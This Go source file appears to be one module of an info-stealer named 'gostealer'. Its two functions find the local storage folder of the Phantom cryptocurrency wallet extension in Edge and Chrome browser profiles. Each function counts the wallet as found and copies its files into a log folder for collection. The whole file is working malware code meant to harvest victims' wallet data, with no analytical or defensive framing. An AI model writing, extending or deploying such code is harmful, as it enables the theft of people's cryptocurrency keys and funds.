package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyPhantomEdge(browserPath, logFolderPath string) {
	phantomc := path.Join(browserPath, "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")

	if _, err := os.Stat(phantomc); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "phantom_edge_chromeversion\n"
	}
	// ____________________

	utils.CopyFolderFiles(phantomc, path.Join(logFolderPath, "wallets", "phantom_edge_chromeversion"))
}

func CopyPhantomChrome(browserPath, logFolderPath string) {
	phantom := path.Join(browserPath, "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")

	if _, err := os.Stat(phantom); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "phantom_chrome\n"
	}
	//________________

	utils.CopyFolderFiles(phantom, path.Join(logFolderPath, "wallets", "phantom_chrome"))
}
